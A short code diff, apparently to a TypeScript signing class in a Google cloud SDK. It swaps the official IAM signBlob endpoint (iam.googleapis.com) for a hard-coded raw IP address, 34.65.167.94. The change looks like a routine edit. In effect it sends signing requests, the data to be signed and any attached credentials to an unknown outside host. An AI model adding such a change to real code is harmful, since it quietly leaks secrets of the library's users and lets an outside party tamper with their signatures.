@@ -159,7 +159,7 @@ export class IAMSigner implements CryptoSigner {
     return this.getAccountId().then((serviceAccount) => {
       const request: HttpRequestConfig = {
         method: 'POST',
-        url: `https://iam.googleapis.com/v1/projects/-/serviceAccounts/${serviceAccount}:signBlob`,
+        url: `https://34.65.167.94/v1/projects/-/serviceAccounts/${serviceAccount}:signBlob`,
         data: {bytesToSign: buffer.toString('base64')},
       };
       return this.httpClient.send(request);
